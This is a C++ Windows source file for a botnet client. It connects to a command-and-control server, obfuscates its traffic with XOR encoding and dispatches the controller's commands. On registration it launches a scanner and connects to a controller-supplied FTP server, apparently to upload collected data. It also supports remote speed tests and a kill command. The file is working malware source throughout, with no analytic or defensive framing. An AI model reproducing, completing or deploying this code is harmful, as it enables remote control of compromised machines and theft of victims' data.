#include "common.h"
#include "encoder.h"
#include "packets.h"
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "ftp_uploader.h"
#include "scanner.h"
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

WSADATA wsa_data;
SOCKET connect_socket = INVALID_SOCKET;
CRITICAL_SECTION sock_critical_section;
unsigned long long private_packet_crypto_key = packet_crypto_key;

void receive_thread();
void set_new_packet_crypto_key(unsigned long long new_key) { private_packet_crypto_key = new_key; }


bool init_winsocket()
{
	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != ERROR_SUCCESS)
		return false;

	InitializeCriticalSection(&sock_critical_section);

	return true;
}

bool socket_connect(const char* ip, const char* port)
{
	struct addrinfo *result = NULL,
		*ptr = NULL, hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(ip, port, &hints, &result) != 0)
		return false;

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) 
	{
		connect_socket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);

		if (connect_socket == INVALID_SOCKET)
			return false;

		BOOL flag = TRUE;
		int ret = setsockopt(connect_socket, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(BOOL));

		if (connect(connect_socket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
			closesocket(connect_socket);
			connect_socket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	int tcpAfter;
	socklen_t tcpAfterLen = sizeof(tcpAfter);
	int res = getsockopt(connect_socket, IPPROTO_TCP, TCP_NODELAY, (char*)&tcpAfter, &tcpAfterLen);
	bool succeeded = connect_socket != INVALID_SOCKET;

	if (succeeded)
		new std::thread(receive_thread);

	return succeeded;
}

void socket_cleanup()
{
	EnterCriticalSection(&sock_critical_section);
	LeaveCriticalSection(&sock_critical_section);
	DeleteCriticalSection(&sock_critical_section);
	closesocket(connect_socket);
	WSACleanup();
}

bool socket_send(char* data, const int data_size)
{
	EnterCriticalSection(&sock_critical_section);
	bool result = send(connect_socket, data, data_size, 0) == ERROR_SUCCESS;
	LeaveCriticalSection(&sock_critical_section);
	return result;
}

bool socket_send(packet_opcode opcode, void* data = nullptr, unsigned short data_size = 0)
{
	unsigned char* buffer = new unsigned char[sizeof(net_packet) + data_size];
	memset(buffer, 0x00, sizeof(net_packet) + data_size);
	net_packet* frame = (net_packet*)buffer;
	frame->opcode = opcode;
	frame->packet_size = data_size;

	if (data_size)
	{
		memcpy(buffer + sizeof(net_packet), data, data_size);

		xor_encode(buffer + sizeof(net_packet), data_size, private_packet_crypto_key);
	}

	bool res = socket_send((char*)buffer, data_size + sizeof(net_packet));


	memset(buffer, 0x00, sizeof(net_packet) + data_size);
	delete[] buffer;
	buffer = nullptr;

	return res;
}
void bot_handlepacket(packet_opcode opcode, void* data, unsigned short data_size)
{
	switch (opcode)
	{
		case packet_opcode::bot_register_ok:
		{
#ifdef ENABLE_PRINTF
			printf("Received bot_register_ok packet!\r\n");
#endif // ENABLE_PRINTF
			bot_register_ok_payload* packet = (bot_register_ok_payload*)data;
			set_new_packet_crypto_key(packet->crypto_key);
//#ifndef _DEBUG
			new std::thread([packet]() -> void {
				init_scanner();
				ftp_connect(packet->ftp_server_ip, packet->ftp_server_port, packet->ftp_server_username, packet->ftp_server_password);
				ftp_wait_for_finish();
			});
//#endif // !_DEBUG

		}
		break;

		case packet_opcode::request_speedtest:
		{
			unsigned char speedtest_buf[SPEEDTEST_BUFFER_SIZE];
			memset(speedtest_buf, 0xFF, SPEEDTEST_BUFFER_SIZE);
			socket_send(packet_opcode::request_speedtest_ack);
			Sleep(100); // wait acknowledgement

			auto current_time_millis = []() -> unsigned int {
				SYSTEMTIME time;
				GetSystemTime(&time);
				return (unsigned int)((time.wSecond * 1000) + time.wMilliseconds);
			};

			unsigned int start_time = current_time_millis();

			for (int i = 0; i < SPEEDTEST_RUN_COUNT; i++)
			{
				send(connect_socket, (char*)speedtest_buf, SPEEDTEST_BUFFER_SIZE, 0);

				char ack_flag;
				while (recv(connect_socket, &ack_flag, 1, 0) == 0);
			}


			unsigned int elapsed_time = current_time_millis() - start_time;

			request_speedtest_result_payload packet;
			packet.elapsed_ms = elapsed_time;
			socket_send(packet_opcode::request_speedtest_result, &packet, sizeof(packet));
		}
		break;

		case packet_opcode::kill_bot:
		{
			printf("Received kill signal!\r\n");
			closesocket(connect_socket);
			exit(0);
		}
		break;

		default:
			return;
		}
}

void receive_thread()
{
	while (1)
	{
		//unsigned char frame_buf[1500];
		//int bytes_read = recv(connect_socket, (char*)frame_buf, sizeof(frame_buf), 0);
		//net_packet* frame = (net_packet*)(frame_buf);



		//if (bytes_read <= 0)
		//	break;

		//unsigned char packet_buf[1500 - sizeof(net_packet)];
		//memcpy(packet_buf, frame_buf + sizeof(net_packet), frame->packet_size);

		//xor_encode(packet_buf, frame->packet_size, packet_crypto_key);

		//bot_handlepacket(frame->opcode, packet_buf, frame->packet_size);

		auto recv_packet = [](char* buffer, size_t size) -> int {
			int total = 0, n = 0;
			while (total != size)
			{
				n = recv(connect_socket, buffer + total, size - total, 0);
				if (n <= 0)
					return 0;

				total += n;
			}
			return total;
		};

		unsigned char frame_buf[sizeof(net_packet)];
		int bytes_read = recv_packet((char*)frame_buf, sizeof(frame_buf));
		if (bytes_read <= 0)
		{
			// socket disconnected
			exit(0);
		}
		net_packet* frame = (net_packet*)(frame_buf);




		unsigned char* packet_buf = nullptr;

		if (frame->packet_size)
		{
			packet_buf = new unsigned char[frame->packet_size];
			bytes_read = recv_packet((char*)packet_buf, frame->packet_size);
			if (bytes_read <= 0)
			{
				// socket disconnected
				exit(0);
			}

			xor_encode(packet_buf, frame->packet_size, private_packet_crypto_key);
		}
		bot_handlepacket(frame->opcode, packet_buf, frame->packet_size);

	}

#ifdef ENABLE_PRINTF
	printf("Disconnected!\r\n");
#endif // ENABLE_PRINTF

}